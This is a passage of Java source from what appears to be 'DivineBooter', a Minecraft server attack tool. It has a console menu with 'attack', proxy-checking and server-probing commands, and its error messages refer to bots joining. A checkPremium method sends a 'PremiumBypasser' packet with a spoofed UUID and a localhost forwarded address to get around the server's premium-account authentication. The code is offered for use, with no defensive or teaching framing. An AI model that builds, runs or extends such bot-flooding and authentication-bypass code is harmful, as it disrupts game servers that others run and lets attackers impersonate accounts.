                    LoginStart packetLoginStart = new LoginStart("moonl1ght01");
                    packetLoginStart.sendPacket(dataOutputStream);

                    int id = DataTypes.readVarInt(dataInputStream);

                    ColorsUtils.setColor("yellow");
                    System.out.print("Premium: ");
                    ColorsUtils.setColor("red");
                    System.out.println(id == 0x03 ? "No." : "Yes.");
                    System.out.println("");
                    //System.out.println("Players' names (note that this will be empty if server doesn't have this feature): " + samplePlayers);
                }
                else { System.err.println("Unknown command! Type \"help\" for a list of commands."); }
            } catch (InputMismatchException | InterruptedException | ParseException e) {
                System.err.println("You have to insert a string for the IP and");
                System.err.println("an integer number for the port!");
            } catch (ConnectException e) {
                System.err.println("\n[DivineError] Server is offline\n");
            } catch (NullPointerException e) {
                System.err.print("");
            } catch (SocketException e) {
                System.err.println("[DivineError] Server is lagging too much, bots can't join!");
            } catch (UnknownHostException e) {
                System.err.println("\n[DivineError] Server doesn't exist.\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void lgbtThemeAttackManager() {
        String select = "";

        while(true) {
            lgbtThemeParseManager("DivineBooter\n");
            lgbtThemeParseManager("> ");

            try {
                try {
                    ColorsUtils.setColor("purple");
                    select = bufferedReader.readLine();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                if (select.equalsIgnoreCase("attack")) { lgbtThemeAttack(); }
                else if (select.equalsIgnoreCase("proxychecker")) {
                    String fileName;

                    lgbtThemeParseManager("\nType proxies' file name: ");
                    ColorsUtils.setColor("purple");
                    fileName = bufferedReader.readLine();

                    checkProxy(fileName);
                } else if (select.equalsIgnoreCase("help")) {
                    lgbtThemeParseManager("\nHelp: displays this page.");
                    lgbtThemeParseManager("Proxychecker: checks if proxies (without port because it checks the host) are working.");
                    lgbtThemeParseManager("Getinfo: gets info about a minecraft server.");
                    lgbtThemeParseManager("Attack: attacks.\n");
                } else if (select.equalsIgnoreCase("getinfo")) {
                    String host = new String();
                    int port;

                    lgbtThemeParseManager("Type server's IP: ");
                    ColorsUtils.setColor("purple");
                    host = bufferedReader.readLine();

                    lgbtThemeParseManager("Type server's port: ");
                    ColorsUtils.setColor("purple");
                    port = Integer.parseInt(bufferedReader.readLine());
                    lgbtThemeParseManager("\n");

                    String serverStatus = StatusManager.serverStatus(host, port);

                    lgbtThemeParseManager(serverStatus);

                    JSONParser jsonParser = new JSONParser();
                    JSONObject jsonObject = (JSONObject) jsonParser.parse(serverStatus);

                    Socket socket = new Socket();
                    InetSocketAddress inetSocketAddress = new InetSocketAddress(host, port);
                    socket.connect(inetSocketAddress);

                    DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
                    DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());

                    PacketSetCompression packetSetCompression = new PacketSetCompression();

                    JSONObject version = (JSONObject) jsonObject.get("version");
                    long protocol = (long) version.get("protocol");

                    JSONObject playersManager = (JSONObject) jsonObject.get("players");
                    long maxPlayers = (long) playersManager.get("max");
                    long onlinePlayers = (long) playersManager.get("online");
                    //long samplePlayers = (long) playersManager.get("sample");

                    lgbtThemeParseManager("IP Host: ");
                    lgbtThemeParseManager(host + "\n");

                    lgbtThemeParseManager("Numerical IP: ");
                    InetSocketAddress inetSocketAddress1 = new InetSocketAddress(host, port);

                    if (inetSocketAddress1.getAddress().toString().contains(host)) {
                        String[] complexHost = inetSocketAddress1.getAddress().toString().split("/");
                        String numericalHost = complexHost[1];
                        lgbtThemeParseManager(numericalHost + "\n");
                    }

                    //System.out.println(inetSocketAddress1.getAddress());

                    lgbtThemeParseManager("Port: ");
                    lgbtThemeParseManager(port + "\n");

                    lgbtThemeParseManager("Protocol: ");
                    lgbtThemeParseManager(protocol + "\n");

                    lgbtThemeParseManager("Online players: ");
                    lgbtThemeParseManager(onlinePlayers + "\n");

                    lgbtThemeParseManager("Max players: ");
                    lgbtThemeParseManager(maxPlayers + "\n");

                    HandshakePacket packetHandshake = new HandshakePacket((int) protocol, host, port, NextState.LOGIN);
                    packetHandshake.sendPacket(dataOutputStream);

                    Thread.sleep(250);

                    LoginStart packetLoginStart = new LoginStart("moonl1ght01");
                    packetLoginStart.sendPacket(dataOutputStream);

                    int id = DataTypes.readVarInt(dataInputStream);

                    lgbtThemeParseManager("Premium: ");
                    lgbtThemeParseManager(id == 0x03 ? "No." : "Yes.");
                    lgbtThemeParseManager("\n");
                    //System.out.println("Players' names (note that this will be empty if server doesn't have this feature): " + samplePlayers);
                }
                else { lgbtThemeParseManager("Unknown command! Type \"help\" for a list of commands."); }
            } catch (InputMismatchException | InterruptedException | ParseException e) {
                lgbtThemeParseManager("You have to insert a string for the IP and");
                lgbtThemeParseManager("an integer number for the port!");
            } catch (ConnectException e) {
                lgbtThemeParseManager("\n[DivineError] Server is offline\n");
            } catch (NullPointerException e) {
                System.err.print("");
            } catch (SocketException e) {
                lgbtThemeParseManager("[DivineError] Server is lagging too much, bots can't join!");
            } catch (UnknownHostException e) {
                lgbtThemeParseManager("\n[DivineError] Server doesn't exist.\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static void checkPremium(DataInputStream dataInputStream, DataOutputStream dataOutputStream, int protocol, String IP, int port) throws IOException {
        String spoofedUUID = "1ea2dfd1-40bf-45c4-8c67-392e806f387d";
        PremiumBypasser premiumBypasser = new PremiumBypasser(protocol,
                IP, (short) port, NextState.LOGIN, "127.0.0.1", spoofedUUID);
        int id = DataTypes.readVarInt(dataInputStream);

        if (id == 0x03) return;
        else premiumBypasser.sendPacket(dataOutputStream);

    }

    private static void loadTheme() throws IOException {
        File file = new File("divineThemeSelector.txt");
        if (!file.exists()) defaultThemeAttackManager();

        else {
            BufferedReader fileReader = new BufferedReader(new FileReader(file));
            String fileManager = fileReader.readLine();

            if (fileManager.equalsIgnoreCase("default")) defaultThemeAttackManager();
            else if (fileManager.equalsIgnoreCase("colorblind")) colorblindThemeAttackManager();
            else if (fileManager.equalsIgnoreCase("lgbt")) lgbtThemeAttackManager();
            else {
                System.out.println("No valid theme found! Loading default theme...");
                defaultThemeAttackManager();
            }
        }
    }

    private static void lgbtThemeParseManager(String s) {
        StringBuilder stringBuilder = new StringBuilder();
        char c = ' ';

        for (int i = 0; i < s.length(); i++) {
            c = s.charAt(i);
            if (i == 0) stringBuilder.append(c + ColorsUtils.red);
            if (i == 1) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 2) stringBuilder.append(c + ColorsUtils.green);
            if (i == 3) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 4) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 5) stringBuilder.append(c + ColorsUtils.red);
            if (i == 6) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 7) stringBuilder.append(c + ColorsUtils.green);
            if (i == 8) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 9) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 10) stringBuilder.append(c + ColorsUtils.red);
            if (i == 11) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 12) stringBuilder.append(c + ColorsUtils.green);
            if (i == 13) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 14) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 15) stringBuilder.append(c + ColorsUtils.red);
            if (i == 16) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 17) stringBuilder.append(c + ColorsUtils.green);
            if (i == 18) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 19) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 20) stringBuilder.append(c + ColorsUtils.red);
            if (i == 21) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 22) stringBuilder.append(c + ColorsUtils.green);
            if (i == 23) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 24) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 25) stringBuilder.append(c + ColorsUtils.red);
            if (i == 26) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 27) stringBuilder.append(c + ColorsUtils.green);
            if (i == 28) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 29) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 30) stringBuilder.append(c + ColorsUtils.red);
            if (i == 31) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 32) stringBuilder.append(c + ColorsUtils.green);
            if (i == 33) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 34) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 35) stringBuilder.append(c + ColorsUtils.red);
            if (i == 36) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 37) stringBuilder.append(c + ColorsUtils.green);
            if (i == 38) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 39) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 40) stringBuilder.append(c + ColorsUtils.red);
            if (i == 41) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 42) stringBuilder.append(c + ColorsUtils.green);
            if (i == 43) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 44) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 45) stringBuilder.append(c + ColorsUtils.red);
            if (i == 46) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 47) stringBuilder.append(c + ColorsUtils.green);
            if (i == 48) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 49) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 50) stringBuilder.append(c + ColorsUtils.red);
            if (i == 51) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 52) stringBuilder.append(c + ColorsUtils.green);
            if (i == 53) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 54) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 55) stringBuilder.append(c + ColorsUtils.red);
            if (i == 56) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 57) stringBuilder.append(c + ColorsUtils.green);
            if (i == 58) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 59) stringBuilder.append(c + ColorsUtils.purple);
            if (i == 60) stringBuilder.append(c + ColorsUtils.red);
            if (i == 61) stringBuilder.append(c + ColorsUtils.yellow);
            if (i == 62) stringBuilder.append(c + ColorsUtils.green);
            if (i == 63) stringBuilder.append(c + ColorsUtils.blue);
            if (i == 64) stringBuilder.append(c + ColorsUtils.purple);

            if(i >= s.length()) {
                i = 0;
            }
        }
        System.out.print(stringBuilder);
    }

    public static void main(String[] args) throws IOException {
        loadTheme();
    }
}
